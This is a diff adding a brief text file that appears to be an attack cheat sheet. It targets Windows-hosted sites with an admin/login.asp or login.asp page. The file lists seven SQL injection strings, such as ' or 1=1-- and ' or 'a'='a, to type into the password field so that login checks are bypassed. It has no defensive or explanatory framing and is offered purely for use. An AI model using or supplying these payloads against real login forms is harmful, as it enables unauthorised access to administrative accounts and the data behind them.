@@ -1,0 +1,22 @@
+Windows SQL injection (site contain /admin/login.asp or just login.asp page)
+
+
+Instead password use one of this string
+
+' or 1=1-- 
+
+" or 1=1-- 
+
+or 1=1--
+
+' or 'a'='a
+
+" or "a"="a
+
+') or ('a'='a
+
+") or ("a"="a 
+
+
+
+
